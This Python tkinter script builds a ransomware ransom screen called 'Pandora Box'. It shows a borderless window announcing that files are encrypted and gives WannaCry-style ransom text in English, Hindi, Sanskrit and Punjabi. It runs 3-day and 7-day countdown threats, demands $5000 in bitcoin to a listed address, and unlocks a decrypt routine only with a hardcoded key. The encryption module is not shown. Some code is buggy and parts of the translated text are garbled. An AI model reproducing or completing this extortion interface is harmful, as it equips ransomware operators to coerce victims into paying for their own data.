from tkinter import *
from tkinter import messagebox,ttk,PhotoImage,Canvas,mainloop,Button,Text,END,Toplevel
from tkinter import scrolledtext,font
from datetime import datetime, timedelta
import pyperclip
from PIL import Image, ImageTk
import dec



def decryption_key():
      print("hello world")

def hello():
    # Create a font with a larger size and bold weight
    bold_font = ('Arial', 20, 'bold')  # Change 12 to the desired font size
    choices = ["English", "Hindi", "Sanskrit", "Punjabi"]

    # Create the Combobox with the bold font
    global dropdown1
    dropdown1 = ttk.Combobox(canvas, values=choices, height=10.0, width=10, font=bold_font,state="readonly",takefocus=False)
    dropdown1.set('English')
    dropdown1.place(x=1320, y=40)
    dropdown1.bind("<<ComboboxSelected>>", on_dropdown_change)


def get_text():
     text1= text_area.get("1.0", "end-1c")
     pyperclip.copy(text) 

def on_dropdown_change(event):
    selected_language = dropdown1.get()
    if selected_language == "English":
        text_area.config(state="normal")
        text_area.delete("1.0", "end")
        text_area.insert("1.0", text_1)
        text_area.tag_configure("bold", font=("Arial Bold", 19, "bold"))
        text_area.tag_add("bold", "1.0", "1.28")  # Apply bold style to the first line
        text_area.tag_add("bold", "8.0", "8.28")
        text_area.tag_add("bold", "16.0", "16.28")
        text_area.tag_add("bold", "22.0", "22.28")
        text_area.configure(state="disabled")
    elif selected_language == "Hindi":
        text_area.config(state="normal")
        text_area.delete("1.0", "end")
        text_area.insert("1.0", text_2)
        text_area.tag_configure("bold", font=("Arial Bold", 19, "bold"))
        text_area.tag_add("bold", "1.0", "1.28")  # Apply bold style to the first line
        text_area.tag_add("bold", "8.0", "8.28")
        text_area.tag_add("bold", "16.0", "16.28")
        text_area.tag_add("bold", "22.0", "22.28")
        text_area.configure(state="disabled")
    elif selected_language == "Sanskrit":
        text_area.config(state="normal")
        text_area.delete("1.0", "end")
        text_area.insert("1.0", text_3)
        text_area.tag_configure("bold", font=("Arial Bold", 19, "bold"))
        text_area.tag_add("bold", "1.0", "1.28")  # Apply bold style to the first line
        text_area.tag_add("bold", "8.0", "8.28")
        text_area.tag_add("bold", "16.0", "16.28")
        text_area.tag_add("bold", "22.0", "22.28")
        text_area.configure(state="disabled")
    elif selected_language == "Punjabi":
        text_area.config(state="normal")
        text_area.delete("1.0", "end")
        text_area.insert("1.0", text_4)
        text_area.tag_configure("bold", font=("Arial Bold", 19, "bold"))
        text_area.tag_add("bold", "1.0", "1.28")  # Apply bold style to the first line
        text_area.tag_add("bold", "8.0", "8.28")
        text_area.tag_add("bold", "16.0", "16.28")
        text_area.tag_add("bold", "22.0", "22.28")
        text_area.configure(state="disabled")
    









root=Tk()
root.title("Pendora box")
root.geometry("1530x800+1+1")
root.overrideredirect(True) 
root.resizable(False,False)
root.configure(bg = "#D4868C")
canvas = Canvas(root,bg = "#D4868C",height = 800,width = 1530,bd = 0,highlightthickness = 0,relief = "ridge")
canvas.place(x = 0, y = 0)





image_image_1 = PhotoImage(file=("images\hello.png"))
image_1 = canvas.create_image(765.0,399.0,image=image_image_1)


logo_img= PhotoImage(file=("images\logo.png"))
image_1 = canvas.create_image(203.0,145.0,image=logo_img)

timer_img= PhotoImage(file=("images\image_3.png"))
image_2 = canvas.create_image(203.0,360.0,image=timer_img)

timer_img2= PhotoImage(file=("images\image_3.png"))
image_3 = canvas.create_image(203.0,530.0,image=timer_img2)

#texts and buttons
canvas.create_text(450.0,35.0,anchor="nw",text="Ooops,your files have been encrypted !!!",fill="#FFFFFF",font=("Inter Bold", 36 * -1))

hello()

text_area = scrolledtext.ScrolledText(canvas, wrap="word", width=50, height=20, bd=0, font=("Helvetica", 14))
text_area.place(x=380,y=90,height=520,width=1110)



global text_1
# Add some text to the text area
text_1 = "What happend to my computer?\n" \
       "                             \n"\
       "Your important files are encrypted.\n"  \
       "Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted.\n" \
       "Maybe you are busy looking for a way to recover your files, but do not waste your time.\n" \
       "Nobody can recover your files without our decryption service.\n" \
        "                             \n"\
       "Can I Recover My Files?\n" \
       "Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time.\n" \
       "You can decrypt some of your files for free. Try now by clicking <Decrypt>.\n" \
       "But if you want to decrypt all your files, you need to pay.\n" \
       "You only have 3 days to submit the payment. After that the price will be doubled.\n" \
       "Also, if you don't pay in 7 days, you won't be able to recover your files forever.\n" \
       "We will have free events for users who are so poor that they couldn't pay in 6 months.\n" \
        "                             \n"\
       "How Do I Pay?\n" \
       "Payment is accepted in Bitcoin only. For more information, click <About bitcoin>.\n" \
       "Please check the current price of Bitcoin and buy some bitcoins. For more information, click <How to buy bitcoins>.\n" \
       "And send the correct amount to the address specified in this window.\n" \
       "Best time to check: 9:00am-11:00am\n" \
       "                             \n"\
       "What is Ransomeware?\n" \
       "Encryption: Ransomware typically encrypts files on the victim's computer, making them inaccessible without the decryption key..\n" \
       "Ransom Demand: After encrypting files, the ransomware displays a message demanding payment, usually in cryptocurrency, in exchange for the decryption key.\n" \
       "Extortion: Ransomware operators threaten to delete or permanently encrypt files if the ransom is not paid within a specified time frame.\n" \
       "Propagation: Ransomware spreads through various vectors, including malicious email attachments, compromised websites, or exploiting vulnerabilities in software.\n" \

text_area.config(state="normal")
text_area.delete("1.0", "end")
text_area.tag_configure("bold", font=("Arial Bold", 19, "bold"))
text_area.insert("1.0", text_1)
text_area.tag_add("bold", "1.0", "1.28")  # Apply bold style to the first line
text_area.tag_add("bold", "8.0", "8.28")
text_area.tag_add("bold", "16.0", "16.28")
text_area.tag_add("bold", "22.0", "22.28")
text_area.configure(state="disabled")


text_2= "मेरे कंप्यूटर में क्या हुआ?\n"\
        "                     \n"\
        "आपके महत्वपूर्ण फ़ाइलें एन्क्रिप्ट की गई हैं।\n"\
        "आपके कई दस्तावेज़, फ़ोटो, वीडियो, डेटाबेस और अन्य फ़ाइलें अब अगरही हैं क्योंकि उन्हें एन्क्रिप्ट किया गया है।\n"\
        "शायद आप अपनी फ़ाइलों को पुनर्प्राप्त करने के तरीके की तलाश में व्यस्त हैं, लेकिन अपना समय बर्बाद न करें।\n"\
        "हमारे डिक्रिप्शन सेवा के बिना कोई भी आपकी फ़ाइलें पुनर्प्राप्त नहीं कर सकता।\n"\
        " \n"\
        "क्या मैं अपनी फ़ाइलें पुनर्प्राप्त कर सकता हूँ?\n"\
        "हां। हम गारंटी के साथ कह सकते हैं कि आप सभी अपनी फ़ाइलें सुरक्षित और आसानी से पुनर्प्राप्त कर सकते हैं। लेकिन आपके पास पर्याप्त समय नहीं है।\n"\
        "आप अपनी कुछ फ़ाइलें मुफ़्त में डिक्रिप्ट कर सकते हैं। अब <डिक्रिप्ट> पर क्लिक करके प्रयास करें।\n"\
        "लेकिन अगर आप अपनी सभी फ़ाइलें डिक्रिप्ट करना चाहते हैं, तो आपको भुगतान करना होगा।\n"\
        "आपके पास केवल 3 दिन हैं भुगतान करने के लिए। इसके बाद कीमत डबल हो जाएगी।\n"\
        "और अगर आप 7 दिनों में भुगतान नहीं करते हैं, तो आप अपनी फ़ाइलें हमेशा के लिए पुनर्प्राप्त नहीं कर सकेंगे।\n"\
        "हम उन उपयोगकर्ताओं के लिए मुफ़्त घटनाएँ आयोजित करेंगे जो इतने गरीब हैं कि वे 6 महीने में भुगतान नहीं कर सके।\n"\
        " \n"\
        "मैं कैसे भुगतान करूँ?\n"\
        "भुगतान केवल बिटकॉइन में स्वीकार किया जाता है। अधिक जानकारी के लिए, <बिटकॉइन के बारे में> पर क्लिक करें।\n"\
        "कृपया बिटकॉइन की वर्तमान मूल्य की जांच करें और कुछ बिटकॉइन खरीदें। अधिक जानकारी के लिए, <बिटकॉइन कैसे खरीदें> पर क्लिक करें।\n"\
        "और इस विंडो में निर्दिष्ट पते पर सही राशि भेजें।\n"\
        "सर्वोत्तम समय जांचने के लिए: सुबह 9:00 बजे से शाम 11:00 बजे तक\n"\
        " \n"\
        'रैंसमवेयर क्या है?\n'\
        "एन्क्रिप्शन: रैंसमवेयर सामान्यत: विक्टिम के कंप्यूटर पर फ़ाइलों को एन्क्रिप्ट करता है, जिससे उन्हें डिक्रिप्शन कुंजी के बिना पहुँच नहीं होती।"\
        " \n"\
        'रैंसम डिमांड: फ़ाइलों को एन्क्रिप्ट करने के बाद, रैंसमवेयर एक संदेश प्रदर्शित करता है जिसमें भुगतान की मांग की जाती है, साधारणत: क्रिप्टोकरेंसी में, डिक्रिप्शन कुंजी के बदले में।\n'\
        " \n"\
        'एक्सटॉर्शन: रैंसमवेयर ऑपरेटर फ़ाइलों को हमेशा के लिए हटाने या पर्मानेंट एन्क्रिप्ट करने की धमकी देते हैं अगर रैंसम समय सीमा के भीतर नहीं भुगतान होता है।\n'\
        "प्रसार: रैंसमवेयर विभिन्न विक्टर्स के माध्यम से फैलता है, जिसमें शारारिक ईमेल अटैचमेंट, कंप्रोमाइज़्ड वेबसाइट्स, या सॉफ़्टवेयर में ग़लतियों का शोध है।\n"\

text_3="किं भवेद् मम कॉम्प्यूटरे?\n"\
        "\n"\
        'त्वया प्रमुखाः फाइलाः एन्क्रिप्टिताः असन्। तव सर्वाणि निर्दिष्टानि पत्राणि, फोटोनि, वीडियानि, डेटाबेसानि च अन्यानि फाइलानि अद्य अप्राप्याणि सन्ति येषु एन्क्रिप्टितानि अभवन्।\n'\
        "\n"\
        'संभवतः त्वं तव फाइलान् पुनः प्राप्तुं यत्नं कुर्वन् असि, तथापि तव कालः नाश्वस्तः स्यात्। कश्चन तव फाइलान् अपुनः प्राप्तुं न शक्नुवन् विना अस्मिना डिक्रिप्शन सेवया।\n'\
        "\n"\
        'क्या मम फाइलाः पुनः प्राप्यन्ते?\n'\
        "\n"\
        'निश्चितम्। वयं गर्विताः अस्मासु सर्वासु तव फाइलासु सुरक्षिताः सरलेन च पुनः प्राप्यन्ते। तथापि तव कालः अल्पः अस्ति।\n'\
        "\n"\
        'त्वं स्वेच्छया केचन तव फाइलान् नि:शुल्कं डिक्रिप्टुम् शक्नुवः। अद्यापि प्रयत्नं कुरु निःशुल्कं डिक्रिप्टुम् यदा <डिक्रिप्ट्> इति क्लिक्य।\n'\
        "\n"\
        'तथापि यदि तु सर्वाणि तव फाइलानि डिक्रिप्टुम् इच्छसि, तर्हि भुगतानम् करिष्यसि।\n'\
        "\n"\
        'तव भुगताने समयः सुनिर्धिष्टः अस्ति। त्रयोदशे प्रतिष्ठिते दिनेषु त्वाम् भुगताने अन्वेष्टुम् अनुश्रवणं भवतु।\n'\
        "\n"\
        'रैंसमवेयरं किं अस्ति?\n'\
        "\n"\
        'एन्क्रिप्शन: रैंसमवेयरः साधारणतः विक्टिम् कंप्यूटरे फाइलानि एन्क्रिप्टयति, तानि अदृश्यानि भवन्ति निःशुल्कं डिक्रिप्शन कुंज्याः विना।\n'\
        "\n"\
        'रैंसम डिमांड: फाइलानि एन्क्रिप्ट्य अनन्तरं, रैंसमवेयरः संदेशं प्रदर्शयति भुगतानस्य, साधारणतः क्रिप्टोकरेंसीसु, डिक्रिप्शन कुंज्याः प्रतिप्रदानाय।\n'\
        "\n"\
        'एक्सटॉर्शन: रैंसमवेयर ऑपरेटराः फाइलानि हन्तुं वा स्थायित्वेन एन्क्रिप्टयितुं व भयन्ते यदि भुगतानं न कृतवन्तः निश्चितकाले।\n'\
        "\n"\
        'प्रसारः: रैंसमवेयरः विविधानि युक्तिभिः विस्तारयते, समालोचनापूर्वकः ईमेल आत्मिकाः, अप्रतिष्ठिताः वेबसाइटाः वा सॉफ्टवेयरस्य दोषपूर्णतायाः उपयुक्तः।\n'\

text_4='ਮੇਰੇ ਕੰਪਿਊਟਰ ਨਾਲ ਕੀ ਹੋ ਗਿਆ ਹੈ?\n'\
        "\n"\
        'ਤੁਹਾਡੀਆਂ ਮਹੱਤਵਪੂਰਣ ਫਾਇਲਾਂ ਇਨਕਰਿਪਟ ਕੀਤੀ ਗਈਆਂ ਹਨ। ਤੁਹਾਡੇ ਕਈ ਦਸਤਾਵੇਜ਼, ਫੋਟੋਆਂ, ਵੀਡੀਓਜ਼, ਡਾਟਾਬੇਸ ਅਤੇ ਹੋਰ ਫਾਇਲਾਂ ਅਬ ਇਸ ਲਈ ਅਣਪਹੋਂਚ ਹਨ ਕਿ ਉਨ੍ਹਾਂ ਨੂੰ ਇਨਕਰਿਪਟ ਕੀਤਾ ਗਿਆ ਹੈ।\n'\
        "\n"\
        'ਸੰਭਵ ਹੈ ਤੁਸੀਂ ਆਪਣੀਆਂ ਫਾਇਲਾਂ ਨੂੰ ਮੁਆਲਜ਼ਾ ਕਰਨ ਦੀ ਕੋਈ ਰਾਹ ਲੱਭ ਰਹੇ ਹੋ, ਪਰ ਆਪਣਾ ਸਮਾਂ ਬਰਬਾਦ ਨਾ ਕਰੋ।\n'\
        "\n"\
        'ਸਾਡੀ ਡਿਕ੍ਰਿਪਸ਼ਨ ਸੇਵਾ ਬਿਨਾਂ ਕੋਈ ਵੀ ਤੁਹਾਡੀਆਂ ਫਾਇਲਾਂ ਨੂੰ ਮੁਆਲਜ਼ਾ ਨਹੀਂ ਕਰ ਸਕਦਾ।\n'\
        "\n"\
        'ਕੀ ਮੈਂ ਆਪਣੀ ਫਾਇਲਾਂ ਨੂੰ ਮੁਆਲਜ਼ਾ ਕਰ ਸਕਦਾ ਹਾਂ?\n'\
        "\n"\
        'ਜੀ ਹਾਂ, ਅਸੀਂ ਦਾਵਾ ਕਰਦੇ ਹਾਂ ਕਿ ਤੁਸੀਂ ਸਭ ਤੋਂ ਸੁਰੱਖਿਅਤ ਅਤੇ ਆਸਾਨੀ ਨਾਲ ਆਪਣੀਆਂ ਸਾਰੀਆਂ ਫਾਇਲਾਂ ਮੁਆਲਜ਼ਾ ਕਰ ਸਕਦੇ ਹੋ। ਪਰ ਤੁਹਾਡੇ ਕੋਲ ਇਤਨਾ ਸਮਾਂ ਨਹੀਂ ਹੈ।\n'\
        "\n"\
        'ਤੁਸੀਂ ਆਪਣੀਆਂ ਕੁਝ ਫਾਇਲਾਂ ਨੂੰ ਨਿ:ਸ਼ੁਲਕ ਡਿਕ੍ਰਿਪਟ ਕਰ ਸਕਦੇ ਹੋ। ਹੁਣ ਕਲਿੱਕ ਕਰਕੇ ਆਜ਼ਮਾਓ <ਡਿਕ੍ਰਿਪਟ> ਕਰਨਾ।\n'\
        "\n"\
        'ਪਰ ਜੇ ਤੁਸੀਂ ਆਪਣੀਆਂ ਸਾਰੀਆਂ ਫਾਇਲਾਂ ਨੂੰ ਡਿਕ੍ਰਿਪਟ ਕਰਨਾ ਚਾਹੁੰਦੇ ਹੋ, ਤਾਂ ਤੁਹਾਨੂੰ ਭੁਗਤਾਨ ਕਰਨਾ ਪੈਂਦਾ ਹੈ।\n'\
        "\n"\
        'ਤੁਹਾਡੇ ਕੋਲ ਸਿਰਫ 3 ਦਿਨ ਹਨ ਭੁਗਤਾਨ ਦੇ ਲਈ ਪੇਸ਼ ਕਰਨ ਲਈ। ਇਸ ਤੋਂ ਬਾਅਦ, ਭੁਗਤਾਨ ਦੀ ਮੁੱਲ ਦੋਗੁਨੀ ਹੋ ਜਾਵੇਗੀ।\n'\
        "\n"\
        'ਇਸ ਤੋਂ ਇਲਾਵਾ, ਜੇ ਤੁਸੀਂ 7 ਦਿਨਾਂ ਵਿੱਚ ਭੁਗਤਾਨ ਨਹੀਂ ਕਰਦੇ, ਤਾਂ ਤੁਸੀਂ ਹਮੇਸ਼ਾਂ ਲਈ ਆਪਣੀਆਂ ਫਾਇਲਾਂ ਨੂੰ ਮੁਆਲਜ਼ਾ ਨਹੀਂ ਕਰ ਸਕੋਗੇ\n'\













###############################################################"""timer###############################################################"

digital_clock_font = font.Font(family='Helvetica', size=24, weight='bold', slant='italic')
current_date = datetime.now() 
new_date = current_date + timedelta(days=3)
new_date_formatted = new_date.strftime("%m/%d/%Y")
label = Label(canvas, text=new_date_formatted,bg='#841213',fg='white',font=("Inter Bold", 23* -1))
label.place(x=135,y=327)
canvas.create_text(50.0,290.0,anchor="nw",text="Payment will be raised on",fill="#ccbd03",font=("Inter Bold", 23* -1))
time_remaining = new_date - current_date
def update_time():
    global time_remaining
    time_remaining = time_remaining - timedelta(seconds=1)
    time_label.config( text=str(time_remaining))
    canvas.after(1000, update_time)

time_label = Label(canvas, text= str(time_remaining),fg="white",bg="#841213",font=digital_clock_font)
canvas.create_window(50.0,390.0, window=time_label,anchor="nw")
update_time()

canvas.create_text(50.0,460.0,anchor="nw",text="Your data will be lost on",fill="#ccbd03",font=("Inter Bold", 24* -1))
current_datetime = datetime.now()
new_datetime = current_datetime + timedelta(days=7)
new_date_formatted = new_datetime.strftime("%m/%d/%Y")
date_label = Label(canvas, text=new_date_formatted,bg='#841213',fg='white',font=("Inter Bold", 23* -1))
canvas.create_window(130.0, 490.0, window=date_label, anchor='nw')
time_remaining = new_datetime - current_datetime
def update_time_1():
    global time_remaining
    time_remaining = time_remaining - timedelta(seconds=1)
    time_label.config(text=str(time_remaining))
    canvas.after(1000, update_time)

time_label = Label(canvas, text="Time remaining: " + str(time_remaining),font=digital_clock_font,bg="#841213",fg="white")
canvas.create_window(50.0, 550.0, window=time_label, anchor='nw')

# Start the countdown
update_time_1()



canvas.create_rectangle(380, 620, 1300, 760, fill="#841213", outline="white")
canvas.create_text(510.0,630.0,anchor="nw",text="Send $5000 worth bitcoin to this address ",fill="#ccbd03",font=("Inter Bold", 40* -1))


logo2_img=PhotoImage(file="images/logo2.png")
image_4 = canvas.create_image(440.0,710.0,image=logo2_img)


text = " 9d392HP31A24P78Y5511\n"

# Create a text area widget
text_area_3 = Text(root, height=1, width=35, borderwidth=2, font=("Helvetica", 23, "bold"))
text_area_3.place(x=510,y=700)
text_area_3.insert(END, text) 
text_area_3.tag_configure("center", justify="center")
text_area_3.tag_add("center", "2.0", "end")
text_area_3.configure(state='disabled')  # Insert the text into the text area





# Load and display an image on the canvas
decrypt_im= PhotoImage(file="images/decrypt.png")  # Replace "your_image.png" with the path to your image file

def decrypt_window():
        def destroy_window():
              window.destroy()
        
        def decryption_key():
            key_input = entry_1.get()
            
            if key_input == "b'eySY2FUxQZW1yT7PlpcaAO2HdvdJcbiNAgejJBuDvN8='":
                dec.decrypt_file()
                messagebox.showinfo("decryption scucessful","your data is recovered")
                window.destroy()
                root.destroy()
            else:
                messagebox.showerror("Error", "Invalid key")
     

        window = Toplevel(root)
        window.title("Decryption window")
        window.geometry("857x390")
        window.configure(bg = "#FF727A")
        window.resizable(False,False)
        
        canvas = Canvas(window,bg = "#841213",height = 390,width = 857,bd = 0,highlightthickness = 0,relief = "ridge")
        canvas.pack(fill=BOTH, expand=True)

        canvas.create_text(192.0,15.0,anchor="nw",text="Pandora Box\n",fill="#000000",font=("InknutAntiqua Bold", 64 * -1))
        canvas.create_text(24.0,142.0,anchor="nw",text="Enter The Key",fill="#000000",font=("Inika Bold", 32 * -1))

        
        entry_image_1 = PhotoImage(file="images/entry_1.png")
        entry_bg_1 = canvas.create_image(325.5,222.5,image=entry_image_1)
        entry_1 = Entry(window,bd=0,bg="#D9D9D9",fg="#000716",highlightthickness=0,font=("Inika Bold", 30 * -1))
        entry_1.place(x=29.0,y=195.0,width=593.0,height=53.0)

        button_1 = Button(window,text="Decrypt",bg='#CD7F32',borderwidth=0,highlightthickness=0,command=decryption_key,relief="flat",font=("Inika Bold", 32 * -1))
        button_1.place(x=29.0,y=290.0,width=246.0,height=51.0)

        button_2 = Button(window,text="Back",bg='#008080',borderwidth=0,highlightthickness=0,command=destroy_window,relief="flat",font=("Inika Bold", 32 * -1))
        button_2.place(x=350.0,y=290.0,width=246.0,height=51.0)

        



button_decrypt = Button(canvas, text="", anchor="nw",command=decrypt_window,height=49,width=240,image=decrypt_im)
button_window = canvas.create_window(75, 680, anchor="nw", window=button_decrypt)

button_3=Button(text="About bitcoin",fg='#81b1ad',bg='#841213',font=("Inika Bold", 15),height=1,width=12,border=0)
button_3.place(x=1308,y=670)

button_4=Button(text="How to buy bitcoin?",fg='#81b1ad',bg='#841213',font=("Inika Bold", 15),height=1,width=15,border=0)
button_4.place(x=1320,y=700)

button_3=Button(text="Contact us",fg='#81b1ad',bg='#841213',font=("Inika Bold", 15),height=1,width=12,border=0)
button_3.place(x=1301,y=730)




button = Button(root, text="Copy", command=get_text, width=10, height=1,font=("Helvetica", 16, "bold"))
button.place(x=1125, y=700)


root=mainloop()



